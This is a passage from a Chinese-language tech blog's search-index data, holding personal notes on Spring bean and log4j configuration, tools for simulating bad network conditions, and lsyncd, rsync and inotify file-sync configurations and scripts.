描述當前的物件需要由 spring 容器管理 id 屬性: 標示物件，未來在應用程序中可以根據 id 獲取物件 class: 被管理物件的類全名 --\u003e \u003cbean id=\"service\" class=\"hello.MessageService\"\u003e\u003c/bean\u003e \u003c!-- \u003cproperty name=\"service\" ... 這邊的 name 是指 MessagePrinter.java private MessageService service; ref=\"service\" 這邊的 service 是指上面的 \u003cbean id=\"service\" class=\"hello.MessageService\"\u003e\u003c/bean\u003e --\u003e \u003cbean id=\"printer\" class=\"hello.MessagePrinter\"\u003e \u003cproperty name=\"service\" ref=\"service\"\u003e \u003c/bean\u003e \u003c/beans\u003e Application ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:4:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"Eclipse 建置 applicationContext.xml eclipse 新建applicationContext.xml文件 - 开发者知识库 目前只找到複製方式貼上… \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003c/beans\u003e 這樣就能正常執行了 ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:4:1","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"Resource leak: context is never closed 警告：Spring ApplicationContext - Resource leak: context is never closed的处理_Java_梅森上校的博客 业精于勤荒于嬉，形成于思毁于随。-CSDN博客 spring - How does this code resolve “Resource Leak:‘context’ is never closed” warning? - Stack Overflow ((ConfigurableApplicationContext) context).close(); ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:4:2","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"Spring 查看 log4j IoC 過程 Spring 使用 common-logging ，所以看一下關方文件說明 To make Log4j 1.2 work with the default JCL dependency (commons-logging) all you need to do is put Log4j on the classpath, and provide it with a configuration file (log4j.properties or log4j.xml in the root of the classpath) 2. Introduction to the Spring Framework common-logging 跟 slf4j 差別 java日志组件介绍（common-logging，log4j，slf4j，logback ）_Java_yycdaizi的专栏-CSDN博客 slf4j 與 common-logging 比較 common-logging通過動態查找的機制，在程序運行時自動找出真正使用的日誌庫。由於它使用了ClassLoader尋找和載入底層的日誌庫， 導致了象OSGI這樣的框架無法正常工作，因為OSGI的不同的插件使用自己的ClassLoader。 OSGI的這種機制保證了插件互相獨立，然而卻使Apache Common-Logging無法工作。 slf4j在編譯時靜態綁定真正的Log庫,因此可以再OSGI中使用。另外，SLF4J 支持參數化的log字符串，避免了之前為了減少字符串拼接的性能損耗而不得不寫的if(logger.isDebugEnable())，現在你可以直接寫：logger.debug(「current user is: {}」, user)。拼裝消息被推遲到了它能夠確定是不是要顯示這條消息的時候，但是獲取參數的代價並沒有倖免。 \u003cdependency\u003e \u003cgroupId\u003elog4j\u003c/groupId\u003e \u003cartifactId\u003elog4j\u003c/artifactId\u003e \u003cversion\u003e1.2.17\u003c/version\u003e \u003c/dependency\u003e # info 級別日誌，名子叫 stdout log4j.rootCategory=INFO, stdout # 輸出到控制台上輸出 log4j.appender.stdout=org.apache.log4j.ConsoleAppender # 按照一定格式輸出 log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %t %c{2}:%L - %m%n # spring factory debug 級別輸出 log4j.category.org.springframework.beans.factory=DEBUG 不同 log (SLF4J) 設定可以看2. Introduction to the Spring Framework 這實候執行程式 可以看到以下 log applicationSpring 16:44:28,186 INFO main support.ClassPathXmlApplicationContext:583 - Refreshing org.springframework.context.support.ClassPathXmlApplicationContext@2a18f23c: startup date [Sat May 02 16:44:28 CST 2020]; root of context hierarchy 16:44:28,220 INFO main xml.XmlBeanDefinitionReader:317 - Loading XML bean definitions from class path resource [applicationContext.xml] 16:44:28,242 DEBUG main xml.DefaultDocumentLoader:73 - Using JAXP provider [com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl] 16:44:28,266 DEBUG main xml.PluggableSchemaResolver:141 - Loading schema mappings from [META-INF/spring.schemas] 16:44:28,270 DEBUG main xml.PluggableSchemaResolver:147 - Loaded schema mappings: {http://www.springframework.org/schema/context/spring-context-3.2.xsd=org/springframework/context/config/spring-context-3.2.xsd, http://www.springframework.org/schema/cache/spring-cache-4.3.xsd=org/springframework/cache/config/spring-cache-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-4.0.xsd=org/springframework/beans/factory/xml/spring-beans-4.0.xsd, http://www.springframework.org/schema/context/spring-context-2.5.xsd=org/springframework/context/config/spring-context-2.5.xsd, http://www.springframework.org/schema/context/spring-context-4.0.xsd=org/springframework/context/config/spring-context-4.0.xsd, http://www.springframework.org/schema/util/spring-util-4.3.xsd=org/springframework/beans/factory/xml/spring-util-4.3.xsd, http://www.springframework.org/schema/jee/spring-jee-2.0.xsd=org/springframework/ejb/config/spring-jee-2.0.xsd, http://www.springframework.org/schema/aop/spring-aop-2.0.xsd=org/springframework/aop/config/spring-aop-2.0.xsd, http://www.springframework.org/schema/tool/spring-tool-4.3.xsd=org/springframework/beans/factory/xml/spring-tool-4.3.xsd, http://www.springframework.org/schema/util/spring-util-2.0.xsd=org/springframework/beans/factory/xml/spring-util-2.0.xsd, http://www.springframework.org/schema/cache/spring-cache-4.2.xsd=org/springframework/cache/config/spring-cache-4.2.xsd, http://www.springframework.org/schema/context/spring-context-3.1.xsd=org/springframework/context/config/spring-context-3.1.xsd, http://www.springframework.org/schema/tool/spring-tool-2.0.xsd=org/springframework/beans/factory/xml/spring-tool-2.0.xsd, http://www.springframework.org/schema/tool/spring-tool.xsd=org/springframework/beans/factory/xml/spring-tool-4.3.xsd, http://www.springframework.org/schema/beans/spring-beans-3.2.xsd=org/springframework/beans/factory/xml/spring-beans-3.2.xsd, http://www.springframework.org/schema/util/spring-util-4.2.xsd=org/springf","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:5:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"log4j:WARN No appenders could be found for logger (org.springframework.core.env.StandardEnvironment). 出現這個代表 log設定檔放錯地方 src\\main\\resources\\log4j.properties ","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:5:1","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Java"],"content":"autowired 加載方式 TODO 建構子 成員變數 setter method 任意 method","date":"2020-05-02","objectID":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/:6:0","tags":["spring","java"],"title":"Spring 建立應用程式起手式","uri":"/blog/posts/Spring-%E5%BB%BA%E7%AB%8B%E6%87%89%E7%94%A8%E7%A8%8B%E5%BC%8F%E8%B5%B7%E6%89%8B%E5%BC%8F/"},{"categories":["Linux"],"content":"之前有跟別的廠商藉接機器 但是後來覺得網路順斷，機器不會自動連線 一直在想有什麼可以模擬這種網路狀況 機器還可不可以運作 最近有爬到一些文章 最後嘗試，我這種情境還是沒辦法模擬出當時狀況 所以這篇就單純紀錄 因為最近動物機載 BT ，偶爾會發生連不到動物機狀態 嚴重是完全連不到，輕微拔掉網路線就會正常一下，過一會就 ping 不到 我朋友估計是樹莓派問題，重開機就會正常… log 也沒有看到哪裡出問題，不知道公司狀況也是不是這一種? 連線方法可以參考(下面內容):Linux在Wifi使用pppoe連線後，重開機不能連線上網 | 程式狂想筆記 ","date":"2020-04-26","objectID":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:0:0","tags":["linux","tc"],"title":"模擬不良網路環境方法","uri":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"tc iptables 限速 - 哈希 Linux模拟复杂网络环境下的传输（netem和tc） - 哈希 備份圖 內有範例可以快速操作，推薦看這篇。 Linux Traffic Control (tc) 研究 // Yuanchieh’s Blog備份圖 ","date":"2020-04-26","objectID":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:1:0","tags":["linux","tc"],"title":"模擬不良網路環境方法","uri":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"tc 查看 list tc qdisc show tc class show dev eth0 tc filter show dev eth0 linux - tc / iproute2, how to list the configuration - Super User ","date":"2020-04-26","objectID":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:2:0","tags":["linux","tc"],"title":"模擬不良網路環境方法","uri":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"comcast 使用 tc netem 模拟网络异常 | Cizixs Write Here tylertreat/comcast: Simulating shitty network connections so you can build better systems. ","date":"2020-04-26","objectID":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:3:0","tags":["linux","tc"],"title":"模擬不良網路環境方法","uri":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"pyshaper pyshaper是一個帶有gui的限速工具。 ","date":"2020-04-26","objectID":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:4:0","tags":["linux","tc"],"title":"模擬不良網路環境方法","uri":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"連結紀錄 跟我想像的不太一樣，有空再補 iptables 限速 - 哈希 Linux模拟复杂网络环境下的传输（netem和tc） - 哈希 使用 tc netem 模拟网络异常 | Cizixs Write Here tylertreat/comcast: Simulating shitty network connections so you can build better systems. linux的traffic control@小鸟技术笔记 利用Dummynet模拟恶劣网络环境_运维_baidu_zhongce的博客-CSDN博客 模拟恶劣网络环境常用的几种解决方案 - 狂师 - 博客园 pyshaper - your easy dynamic traffic-shaper 如何模拟弱网测试 - 尚码园 Linux模拟复杂网络环境下的传输（netem和tc） - 哈希 linux下使用iptables和tc限制流量笔记 | Chronos Linux Traffic Control (tc) 研究 // Yuanchieh’s Blog ","date":"2020-04-26","objectID":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/:5:0","tags":["linux","tc"],"title":"模擬不良網路環境方法","uri":"/blog/posts/%E6%A8%A1%E6%93%AC%E4%B8%8D%E8%89%AF%E7%B6%B2%E8%B7%AF%E7%92%B0%E5%A2%83%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"最近看到這幾篇使用 inotify 做文件同步感到有興趣 雖然現在工作上目前還沒用到 但這種情境感覺很常遇到 希望能用不用寫程式方法 Rsync + inotify 做文件实时同步 - 哈希 Rsync + sersync 实现文件实时同步 - 哈希 rsync + lsyncd 实现文件实时同步 - 哈希 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:0:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"相關工具 inotify inotify-tools 監聽資料夾裡檔案異動工具 | 程式狂想筆記 之前小記這篇，其實裡面沒什麼實作 需透過 bash 執行 但這樣當然不是很方便，所以有類似 sersync 和 lsyncd 工具解決這個方案 sersync 這篇lsyncd实时同步搭建指南——取代rsync+inotify-Linux运维日志有講到很多優點缺點備份圖 為了不浪費時間 所以我就不實作了 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:1:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"lsyncd ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:2:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"安裝 apt install rsyncd 或去 github 官網抓 axkibe/lsyncd: Lsyncd (Live Syncing Daemon) synchronizes local directories with remote targets lua 記得要升到 5.2 Lua \u003e= 5.2 Lsyncd depends on Lua 5.2 or greater; that is 5.2 or 5.3. For most distributions you need to install the liblua??, the liblua??-dev and the lua?? package, with ?? being the respective Lua version. cmake \u003e= 2.8 To configure Lsyncd to your system, cmake \u003e= 2.8 is required rsync \u003e= 3.1 During runtime Lsyncd needs rsync \u003e 3.1 installed both on source and target systems. Lsyncd - Building ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:2:1","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"設定 一開始不會有/etc/lsyncd.conf 可以做 service lsync status 有沒有執行 vim /etc/lsyncd.conf 網路上看到是這個路徑 但是我看CONFIG=/etc/lsyncd/lsyncd.conf.lua # 全域設定 settings { logfile = \"/var/log/lsyncd/lsyncd.log\", statusFile = \"/var/log/lsyncd/lsyncd.status\" inotifyMode = \"CloseWrite\", maxProcesses = 8, } ## 以下設定參考 https://www.centos.bz/2017/08/lsyncd-rsync-inotify/ # 可設定多組 # I. 本地目錄同步，direct：cp/rm/mv。 適用：500+萬文件，變動不大 sync { default.direct, source = \"/tmp/src\", target = \"/tmp/dest\", delay = 1 maxProcesses = 1 } # II. 本地目錄同步，rsync模式：rsync sync { default.rsync, source = \"/tmp/src\", target = \"/tmp/dest1\", excludeFrom = \"/etc/rsyncd.d/rsync_exclude.lst\", rsync = { binary = \"/usr/bin/rsync\", archive = true, compress = true, bwlimit = 2000 } } # III. 遠程目錄同步，rsync模式 + rsyncd daemon sync { default.rsync, source = \"/tmp/src\", target = \"syncuser@172.29.88.223::module1\", delete=\"running\", # 可以改成false 這樣就不會刪掉 exclude = { \".*\", \".tmp\" }, delay = 30, init = false, # 默認init功能設置為false來跳過初始rsync過程 rsync = { binary = \"/usr/bin/rsync\", archive = true, compress = true, verbose = true, password_file = \"/etc/rsyncd.d/rsync.pwd\", _extra = {\"--bwlimit=200\"} } } # IV. 遠程目錄同步，rsync模式 + ssh shell sync { default.rsync, source = \"/tmp/src\", target = \"172.29.88.223:/tmp/dest\", # target = \"root@172.29.88.223:/remote/dest\", # 上面target，注意如果是普通用戶，必須擁有寫權限 maxDelays = 5, delay = 30, # init = true, rsync = { binary = \"/usr/bin/rsync\", archive = true, compress = true, bwlimit = 2000 # rsh = \"/usr/bin/ssh -p 22 -o StrictHostKeyChecking=no\" # 如果要指定其它端口，請用上面的rsh } } # V. 遠程目錄同步，rsync模式 + rsyncssh，效果與上面相同 sync { default.rsyncssh, source = \"/tmp/src2\", host = \"172.29.88.223\", targetdir = \"/remote/dir\", excludeFrom = \"/etc/rsyncd.d/rsync_exclude.lst\", # maxDelays = 5, delay = 0, # init = false, rsync = { binary = \"/usr/bin/rsync\", archive = true, compress = true, verbose = true, _extra = {\"--bwlimit=2000\"}, }, ssh = { port = 1234 } } default.direct Default.direct可以用來保持兩個本地目錄同步，比使用default.rsync更好的性能。Default.direct在啟動時使用（就像default.rsync一樣）rsync來初始化目標目錄與源目錄的同步。但是，在正常操作期間，default.direct使用/ bin / cp，/ bin / rm和/ bin / mv來保持同步。所有參數就像default.rsync一樣。 delete 也適用這個屬性 _extra 可放一些參數 想說有沒有 size-only 設定 但發現都找不到 後來看到_extra 可以設定 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:2:2","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"簡單測試 預設是 10 秒檢查資料更新 可設定 statusInterval Lsyncd - The Configuration File settings { logfile = \"/tmp/lsyncd.log\", statusFile = \"/tmp/lsyncd.status\", nodaemon = true, } sync { default.rsync, source = \"/home/malagege/test_lsyncd/a/\", target = \"/home/malagege/test_lsyncd/b/\", default.rsync 預設是執行 /usr/bin/rsync -ltsd –delete –include-from=- –exclude=* SOURCE TARGET 所以會做刪除動作 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:2:3","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"同步完做動作 Lsyncd - FAQ: How can I call a script before or after each rsync operation? #!/bin/bash /usr/bin/rsync \"$@\" result=$? ( if [ $result -eq 0 ]; then echo \"my commands\"; fi ) \u003e/dev/null 2\u003e/dev/null \u003c/dev/null exit $result 這邊注意 rsync 並不是對單一檔案做搬移 而是對整個… echo $@ 結果是 -slt -r --delete --ignore-errors --force --from0 --include-from=- --exclude=* /home/malagege/test_lsyncd/a/ /home/malagege/test_lsyncd/a/ /home/malagege/test_lsyncd/b/ 跟我想要抓的東西不一樣 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:3:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"可能做 Layer 2 做自訂動作 感覺這邊自由度很高 因為我對 lua 不熟 所以就沒打算做這段 關於使用Lsyncd進行數據鏡像同步 | 退思園 備份圖 裡面有官方中文說明 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:4:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"其他參考 Lsyncd - Examples Lsyncd搭建同步镜像-用Lsyncd实现本地和远程服务器之间实时同步 - 江召伟 - 博客园 Bash中的IO與重定向 | 退思園 lsyncd+rsync 实时同步 lsyncd实时同步搭建指南——取代rsync+inotify-Linux运维日志 做网站迁移 大量的小文件怎么办？ - 知乎 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:5:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"同步腳本 以下都是參考:真正的inotify+rsync实时同步 彻底告别同步慢 - 琴酒网络 - 博客园 #!/bin/bash /usr/bin/inotifywait -mrq --format '%w%f'-e create,close_write,delete /backup |while read file #把發生更改的文件列表都接收到file 然後循環，但有什麼鬼用呢？下面的命令都沒有引用這個$file 下面做的是全量rsync do cd /backup \u0026\u0026 rsync -az --delete /backup/ rsync_backup@192.168.24.101::backup/--password-file=/etc/rsync.password done 優化 #!/bin/bash src=/data/ # 需要同步的源路徑 des=data # 目標服務器上 rsync --daemon 發佈的名稱，rsync --daemon這裡就不做介紹了，網上搜一下，比較簡單。 rsync_passwd_file=/etc/rsyncd.passwd # rsync驗證的密碼文件 ip1=192.168.0.18 # 目標服務器1 ip2=192.168.0.19 # 目標服務器2 user=root # rsync --daemon定義的驗證用戶名 cd ${src} # 此方法中，由於rsync同步的特性，這裡必須要先cd到源目錄，inotify再監聽 ./ 才能rsync同步後目錄結構一致，有興趣的同學可以進行各種嘗試觀看其效果 /usr/local/bin/inotifywait -mrq --format '%Xe %w%f' -e modify,create,delete,attrib,close_write,move ./ | while read file # 把監控到有發生更改的\"文件路徑列表\"循環 do INO_EVENT=$(echo $file | awk '{print $1}') # 把inotify輸出切割 把事件類型部分賦值給INO_EVENT INO_FILE=$(echo $file | awk '{print $2}') # 把inotify輸出切割 把文件路徑部分賦值給INO_FILE echo \"-------------------------------$(date)------------------------------------\" echo $file #增加、修改、寫入完成、移動進事件 #增、改放在同一個判斷，因為他們都肯定是針對文件的操作，即使是新建目錄，要同步的也只是一個空目錄，不會影響速度。 if [[ $INO_EVENT =~ 'CREATE' ]] || [[ $INO_EVENT =~ 'MODIFY' ]] || [[ $INO_EVENT =~ 'CLOSE_WRITE' ]] || [[ $INO_EVENT =~ 'MOVED_TO' ]] # 判斷事件類型 then echo 'CREATE or MODIFY or CLOSE_WRITE or MOVED_TO' rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip1}::${des} \u0026\u0026 # INO_FILE變量代表路徑哦 -c校驗文件內容 rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip2}::${des} #仔細看 上面的rsync同步命令 源是用了$(dirname ${INO_FILE})變量 即每次只針對性的同步發生改變的文件的目錄(只同步目標文件的方法在生產環境的某些極端 #環境下會漏文件 現在可以在不漏文件下也有不錯的速度 做到平衡) #然後用-R參數把源的目錄結構遞歸到目標後面 保證目錄結構一致性 fi #刪除、移動出事件 if [[ $INO_EVENT =~ 'DELETE' ]] || [[ $INO_EVENT =~ 'MOVED_FROM' ]] then echo 'DELETE or MOVED_FROM' rsync -avzR --delete --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip1}::${des} \u0026\u0026 rsync -avzR --delete --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip2}::${des} #看rsync命令 如果直接同步已刪除的路徑${INO_FILE}會報no such or directory錯誤 所以這裡同步的源是被刪文件或目錄的上一級路徑 #並加上--delete來刪除目標上有而源中沒有的文件，這裡不能做到指定文件刪除，如果刪除的路徑越靠近根，則同步的目錄月多，同步刪除的操作就越花時間。 #這裡有更好方法的同學，歡迎交流。 fi #修改屬性事件 指 touch chgrp chmod chown等操作 if [[ $INO_EVENT =~ 'ATTRIB' ]] then echo 'ATTRIB' if [ ! -d \"$INO_FILE\" ] # 如果修改屬性的是目錄 則不同步，因為同步目錄會發生遞歸掃瞄，等此目錄下的文件發生同步時，rsync會順帶更新此目錄。 then rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip1}::${des} \u0026\u0026 rsync -avzcR --password-file=${rsync_passwd_file} $(dirname ${INO_FILE}) ${user}@${ip2}::${des} fi fi done 簡單來看就是對檔案做 dirname 備份，減少做多次遞迴 是不是能確認來源是資料夾或檔案，單純 scp 或 rsync 過去是不是比較快? ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:5:1","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["Linux"],"content":"相關同步數量問題 以下參考:等很久資訊室: Lsyncd - Live syncing Daemon 資料夾同步 檢查可監測數量設定值： lsyncd 是依靠 kernel 內建的檔案監測功能 inotify，來回報記錄檔案狀態，而 inotify 預設有設定了一個可監測資料夾數量的限定值。 cat /proc/sys/fs/inotify/max_user_watches 在 CentOS 6.8 內，它預設值是 8192，也就是它只能監測最多 8192 個資料夾。 而我們要同步的資料夾有多少，會不會超過這個數值呢？必竟，若是超過了，它就無法同步到了。 cat /var/run/lsyncd/lsyncd.status 在狀態檔中找到一行如下： Inotify watching 1440 directories 那數字便是目前 lsyncd 所監測的資料夾數量。 如果您看到的數字很靠近 8192 或甚至超過，那就必須放大這個限定值。 echo ‘10000’ \u003e /proc/sys/fs/inotify/max_user_watches 這樣可以即時把限定值改成 10000，但重開機後它又會變成原本的 8192。 下面方法可以改變開機後的預設值： 把上述即時修改的指令放到 rc.local 之類的開機啟動檔內。 或是 在 /etc/sysctl.conf 內加上一行 fs.inotify.max_user_watches = 10000 這樣它重開機後，一樣會放大成我們設定的數值。 ","date":"2020-04-25","objectID":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/:6:0","tags":["lsyncd"],"title":"lsyncd 做檔案同步實作紀錄","uri":"/blog/posts/lsyncd-%E5%81%9A%E6%AA%94%E6%A1%88%E5%90%8C%E6%AD%A5%E5%AF%A6%E4%BD%9C%E7%B4%80%E9%8C%84/"},{"categories":["LINE"],"content":"TODO: 尚未整理完成 ","date":"2020-04-16","objectID":"/blog/posts/%E4%B8%B2%E6%8E%A5-LINE-message-API-WebHook-%E5%92%8C-LIFF-%E5%B0%8F%E8%A8%98/:0:0","tags":["LIFF"],"title":"串接 LINE message API(WebHook)  和 